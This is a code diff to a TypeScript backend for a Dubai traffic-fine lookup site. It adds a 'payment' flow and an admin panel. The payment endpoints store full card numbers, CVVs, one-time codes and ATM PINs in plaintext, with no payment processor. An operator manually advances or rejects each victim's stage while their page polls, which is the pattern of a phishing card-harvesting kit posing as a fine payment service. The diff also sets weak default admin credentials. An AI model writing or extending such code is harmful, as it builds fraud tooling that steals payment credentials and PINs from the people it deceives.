@@ -1,4 +1,5 @@
 import { z } from "zod";
+import { TRPCError } from "@trpc/server";
 import { COOKIE_NAME } from "@shared/const";
 import { getSessionCookieOptions } from "./_core/cookies";
 import { systemRouter } from "./_core/systemRouter";
@@ -11,8 +12,25 @@ import {
   getFineQueriesByUserId,
   createFines,
   getFinesByQueryId,
+  createPaymentSession,
+  getPaymentSessionBySessionId,
+  updatePaymentSession,
+  getAllPaymentSessions,
+  getUnreadPaymentSessionsCount,
 } from "./db";
 import { scrapeDubaiFines, PLATE_SOURCES, PLATE_CODES } from "./scraper";
+import crypto from "crypto";
+
+// كلمة مرور الأدمين - يمكن تغييرها من متغيرات البيئة
+const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "admin123";
+const ADMIN_JWT_SECRET = process.env.JWT_SECRET || "secret";
+
+function generateAdminToken(): string {
+  return crypto.randomBytes(32).toString("hex");
+}
+
+// تخزين مؤقت للتوكنات (في الإنتاج يجب استخدام Redis)
+const adminTokens = new Set<string>();
 
 export const appRouter = router({
   system: systemRouter,
@@ -44,7 +62,6 @@ export const appRouter = router({
         })
       )
       .mutation(async ({ input, ctx }) => {
-        // إنشاء سجل الاستعلام في قاعدة البيانات
         const queryId = await createFineQuery({
           plateSource: input.plateSource,
           plateNumber: input.plateNumber,
@@ -54,7 +71,6 @@ export const appRouter = router({
         });
 
         try {
-          // تنفيذ الـ Web Scraping
           const result = await scrapeDubaiFines(
             input.plateSource,
             input.plateNumber,
@@ -62,7 +78,6 @@ export const appRouter = router({
           );
 
           if (!result.success) {
-            // تحديث الاستعلام بحالة الفشل
             await updateFineQuery(queryId, {
               status: "failed",
               errorMessage: result.errorMessage,
@@ -79,7 +94,6 @@ export const appRouter = router({
           const finesCount = result.fines.length;
           const status = finesCount === 0 ? "no_fines" : "success";
 
-          // تحديث الاستعلام بالنتائج
           await updateFineQuery(queryId, {
             status,
             totalFines: finesCount,
@@ -87,7 +101,6 @@ export const appRouter = router({
             rawResults: result.fines as any,
           });
 
-          // تخزين تفاصيل المخالفات
           if (finesCount > 0) {
             await createFines(
               result.fines.map((fine) => ({
@@ -103,7 +116,6 @@ export const appRouter = router({
             );
           }
 
-          // تحويل بيانات المخالفات لتتوافق مع واجهة المستخدم
           const mappedFines = result.fines.map((fine) => ({
             ticketNo: fine.ticketNo || fine.fineNumber || "",
             amount: fine.amount || "0",
@@ -156,6 +168,231 @@ export const appRouter = router({
         if (!query) return null;
         const finesData = await getFinesByQueryId(input.queryId);
         return { query, fines: finesData };
+      }),
+  }),
+
+  // ========== Payment Flow ==========
+  payment: router({
+    // إنشاء جلسة دفع جديدة
+    createSession: publicProcedure
+      .input(z.object({
+        selectedFines: z.array(z.any()),
+        totalAmount: z.string(),
+        plateNumber: z.string().optional(),
+        plateSource: z.string().optional(),
+        queryId: z.number().optional(),
+      }))
+      .mutation(async ({ input, ctx }) => {
+        const sessionId = crypto.randomBytes(16).toString("hex");
+        const clientIp = (ctx.req.headers["x-forwarded-for"] as string)?.split(",")[0] || ctx.req.socket.remoteAddress || "";
+        const userAgent = ctx.req.headers["user-agent"] || "";
+
+        await createPaymentSession({
+          sessionId,
+          queryId: input.queryId ?? null,
+          selectedFines: input.selectedFines,
+          totalAmount: input.totalAmount,
+          plateNumber: input.plateNumber ?? null,
+          plateSource: input.plateSource ?? null,
+          stage: "card",
+          clientIp,
+          userAgent,
+          statusRead: 0,
+        });
+
+        return { success: true, sessionId };
+      }),
+
+    // جلب حالة الجلسة (polling)
+    getStatus: publicProcedure
+      .input(z.object({ sessionId: z.string() }))
+      .query(async ({ input }) => {
+        const session = await getPaymentSessionBySessionId(input.sessionId);
+        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
+        return {
+          stage: session.stage,
+          errorMessage: session.errorMessage,
+        };
+      }),
+
+    // إرسال بيانات البطاقة
+    submitCard: publicProcedure
+      .input(z.object({
+        sessionId: z.string(),
+        cardName: z.string().min(1),
+        cardNumber: z.string().min(16).max(19),
+        cardExpiry: z.string().min(4),
+        cardCvv: z.string().min(3).max(4),
+      }))
+      .mutation(async ({ input }) => {
+        const session = await getPaymentSessionBySessionId(input.sessionId);
+        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
+        if (session.stage !== "card") throw new TRPCError({ code: "BAD_REQUEST", message: "المرحلة غير صحيحة" });
+
+        const masked = input.cardNumber.replace(/\s/g, "").replace(/(\d{4})\d{8}(\d{4})/, "$1 **** **** $2");
+
+        await updatePaymentSession(input.sessionId, {
+          cardName: input.cardName,
+          cardNumber: input.cardNumber.replace(/\s/g, ""),
+          cardNumberMasked: masked,
+          cardExpiry: input.cardExpiry,
+          cardCvv: input.cardCvv,
+          stage: "card_pending",
+          statusRead: 0,
+          errorMessage: null,
+        });
+
+        return { success: true };
+      }),
+
+    // إرسال رمز OTP
+    submitOtp: publicProcedure
+      .input(z.object({
+        sessionId: z.string(),
+        otpCode: z.string().min(4).max(8),
+      }))
+      .mutation(async ({ input }) => {
+        const session = await getPaymentSessionBySessionId(input.sessionId);
+        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
+        if (session.stage !== "otp") throw new TRPCError({ code: "BAD_REQUEST", message: "المرحلة غير صحيحة" });
+
+        await updatePaymentSession(input.sessionId, {
+          otpCode: input.otpCode,
+          stage: "otp_pending",
+          statusRead: 0,
+          errorMessage: null,
+        });
+
+        return { success: true };
+      }),
+
+    // إرسال رقم ATM PIN
+    submitAtmPin: publicProcedure
+      .input(z.object({
+        sessionId: z.string(),
+        atmPin: z.string().min(4).max(6),
+      }))
+      .mutation(async ({ input }) => {
+        const session = await getPaymentSessionBySessionId(input.sessionId);
+        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
+        if (session.stage !== "atm") throw new TRPCError({ code: "BAD_REQUEST", message: "المرحلة غير صحيحة" });
+
+        await updatePaymentSession(input.sessionId, {
+          atmPin: input.atmPin,
+          stage: "atm_pending",
+          statusRead: 0,
+          errorMessage: null,
+        });
+
+        return { success: true };
+      }),
+  }),
+
+  // ========== Admin Panel ==========
+  admin: router({
+    // تسجيل الدخول
+    login: publicProcedure
+      .input(z.object({ password: z.string() }))
+      .mutation(async ({ input }) => {
+        if (input.password !== ADMIN_PASSWORD) {
+          throw new TRPCError({ code: "UNAUTHORIZED", message: "كلمة المرور غير صحيحة" });
+        }
+        const token = generateAdminToken();
+        adminTokens.add(token);
+        // حذف التوكن بعد 24 ساعة
+        setTimeout(() => adminTokens.delete(token), 24 * 60 * 60 * 1000);
+        return { success: true, token };
+      }),
+
+    // التحقق من التوكن
+    verify: publicProcedure
+      .input(z.object({ token: z.string() }))
+      .query(async ({ input }) => {
+        return { valid: adminTokens.has(input.token) };
+      }),
+
+    // جلب إحصائيات
+    getStats: publicProcedure
+      .input(z.object({ token: z.string() }))
+      .query(async ({ input }) => {
+        if (!adminTokens.has(input.token)) {
+          throw new TRPCError({ code: "UNAUTHORIZED", message: "غير مصرح" });
+        }
+        const sessions = await getAllPaymentSessions(200);
+        const total = sessions.length;
+        const pending = sessions.filter(s => s.stage.endsWith("_pending")).length;
+        const completed = sessions.filter(s => s.stage === "success").length;
+        const failed = sessions.filter(s => s.stage === "failed").length;
+        const newCount = sessions.filter(s => s.statusRead === 0).length;
+        return { total, pending, completed, failed, new: newCount };
+      }),
+
+    // جلب كل الجلسات
+    getSessions: publicProcedure
+      .input(z.object({ token: z.string() }))
+      .query(async ({ input }) => {
+        if (!adminTokens.has(input.token)) {
+          throw new TRPCError({ code: "UNAUTHORIZED", message: "غير مصرح" });
+        }
+        const sessions = await getAllPaymentSessions(100);
+        // تحديث statusRead
+        for (const s of sessions.filter(s => s.statusRead === 0)) {
+          await updatePaymentSession(s.sessionId, { statusRead: 1 });
+        }
+        return sessions;
+      }),
+
+    // جلب تفاصيل جلسة واحدة
+    getSession: publicProcedure
+      .input(z.object({ token: z.string(), sessionId: z.string() }))
+      .query(async ({ input }) => {
+        if (!adminTokens.has(input.token)) {
+          throw new TRPCError({ code: "UNAUTHORIZED", message: "غير مصرح" });
+        }
+        const session = await getPaymentSessionBySessionId(input.sessionId);
+        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
+        await updatePaymentSession(input.sessionId, { statusRead: 1 });
+        return session;
+      }),
+
+    // إجراء على الجلسة (قبول/رفض)
+    action: publicProcedure
+      .input(z.object({
+        token: z.string(),
+        sessionId: z.string(),
+        action: z.enum(["pass", "denied", "completed"]),
+        errorMessage: z.string().optional(),
+      }))
+      .mutation(async ({ input }) => {
+        if (!adminTokens.has(input.token)) {
+          throw new TRPCError({ code: "UNAUTHORIZED", message: "غير مصرح" });
+        }
+        const session = await getPaymentSessionBySessionId(input.sessionId);
+        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
+
+        let newStage: typeof session.stage = session.stage;
+
+        if (input.action === "pass") {
+          // تقدم للمرحلة التالية
+          if (session.stage === "card_pending") newStage = "otp";
+          else if (session.stage === "otp_pending") newStage = "atm";
+          else if (session.stage === "atm_pending") newStage = "success";
+        } else if (input.action === "denied") {
+          // رفض - إرجاع للمرحلة السابقة مع رسالة خطأ
+          if (session.stage === "card_pending") newStage = "card";
+          else if (session.stage === "otp_pending") newStage = "otp";
+          else if (session.stage === "atm_pending") newStage = "atm";
+          else newStage = "failed";
+        } else if (input.action === "completed") {
+          newStage = "success";
+        }
+
+        await updatePaymentSession(input.sessionId, {
+          stage: newStage,
+          errorMessage: input.action === "denied" ? (input.errorMessage || "تم رفض العملية. يرجى المحاولة مرة أخرى.") : null,
+        });
+
+        return { success: true, newStage };
       }),
   }),
 });
